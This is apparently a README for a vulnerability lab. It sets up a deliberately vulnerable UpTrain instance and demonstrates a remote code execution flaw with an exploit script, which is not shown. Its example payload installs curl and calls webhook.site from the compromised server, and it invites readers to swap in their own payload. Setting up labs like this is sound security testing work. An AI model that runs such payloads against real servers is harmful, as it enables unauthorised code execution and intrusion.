# vulnerable instance setup
1. Install the vulnerable instance by running the following command:
```bash
git clone https://github.com/uptrain-ai/uptrain
cd uptrain
# for compatibility with the RCE vulnerability, checkout the commit that still has the vulnerability
git checkout a31cc14eddcb6c0b0b12cbed15f086d98c441c6f
bash run_uptrain.sh
```
open http://localhost:3000 in your browser.

## Exploiting the Vulnerability
To demonstrate the vulnerability, you can send an HTTP request to execute arbitrary code on the server.
### Example
The example payload below runs a shell command to update packages, install `curl`, and send a webhook request. you can replace `apt update && apt install curl -y && curl https://webhook.site/` with your own payload.

```bash
bash exploit.sh
```